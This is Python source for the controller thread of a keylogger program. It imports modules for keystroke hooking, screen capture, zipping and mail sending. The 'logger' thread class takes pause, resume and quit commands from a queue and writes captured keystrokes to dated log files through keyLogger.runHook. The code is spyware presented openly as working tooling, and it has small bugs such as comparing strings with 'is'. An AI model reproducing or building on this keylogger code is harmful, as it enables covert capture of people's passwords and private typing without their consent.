import keyLogger
import screenCap
import threading
import sendMail
import time
import datetime
import zip
import os
from queue import Queue

print_lock = threading.Lock()
"""
Thread for the keylogger
Takes in the output directory as an argument
"""
class logger(threading.Thread):
	outputDir = "null"
	paused = False
	def __init__(self, queue, args=(), kwargs=None):
		global outputDir
		global paused
		paused = False
		threading.Thread.__init__(self, args=(), kwargs=None)
		self.queue = queue
		self.daemon = False
		self.receive_messages = args[0]
		outputDir = args[1]

	def isPaused(self):
		global paused
		return paused	
		
	"""
	This method, and the same method on the other thread classes, continuously checks the 
	internal queue for messages from the main thread.
	This allows the main thread to pause, stop, resume, etc. this thread.
	"""
	def run(self):
		print(threading.currentThread().getName() + " beginning Keylogging")
		global paused
		global outputDir
		val = ""
		while True:
			val = ""
			if not self.queue.empty():
				val = self.queue.get()
			if val is "quit": 
				print(threading.currentThread().getName() + " quitting")
				return True
			elif val is "pause":
				print(threading.currentThread().getName() + " paused")
				paused = True
			elif val is "resume":
				print(threading.currentThread().getName() + " resumed")
				paused = False
			if not paused:
				now = datetime.datetime.now()
				fileName = (str(now.month) + "_" + str(now.day) +
					"_" + str(now.year) + "_keyLog.txt")
				outFile = outputDir + fileName
				keyLogger.runHook(3, outFile)